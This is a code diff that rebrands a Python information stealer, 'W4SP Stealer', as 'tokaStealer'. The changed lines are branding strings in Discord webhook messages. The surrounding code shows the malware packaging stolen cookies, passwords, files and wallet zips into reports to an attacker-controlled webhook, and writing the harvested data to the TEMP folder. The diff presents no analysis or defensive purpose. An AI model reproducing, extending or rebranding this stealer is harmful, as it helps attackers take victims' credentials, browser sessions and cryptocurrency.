@@ -327,7 +327,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@W4SP STEALER",
+                "text": "@tokaSTEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                 },
             "thumbnail": {
@@ -336,7 +336,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
-        "username": "W4SP Stealer",
+        "username": "tokaStealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -364,11 +364,11 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Cookies Stealer",
+                    "title": "toka| Cookies Stealer",
                     "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@W4SP STEALER",
+                        "text": "@tokaSTEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                     }
                 }
@@ -391,11 +391,11 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Password Stealer",
+                    "title": "toka| Password Stealer",
                     "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@W4SP STEALER",
+                        "text": "@tokaSTEALER",
                         "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                     }
                 }
@@ -421,10 +421,10 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "W4SP | File Stealer"
+                    "name": "toka| File Stealer"
                 },
                 "footer": {
-                    "text": "@W4SP STEALER",
+                    "text": "@tokaSTEALER",
                     "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
                 }
                 }
@@ -451,7 +451,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
+        f.write(f"<--tokaSTEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -620,16 +620,16 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "W4SP Zips",
+            "title": "tokaZips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@W4SP STEALER",
+                "text": "@tokaSTEALER",
                 "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
             }
             }
         ],
-        "username": "W4SP Stealer",
+        "username": "tokaStealer",
         "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
         "attachments": []
     }
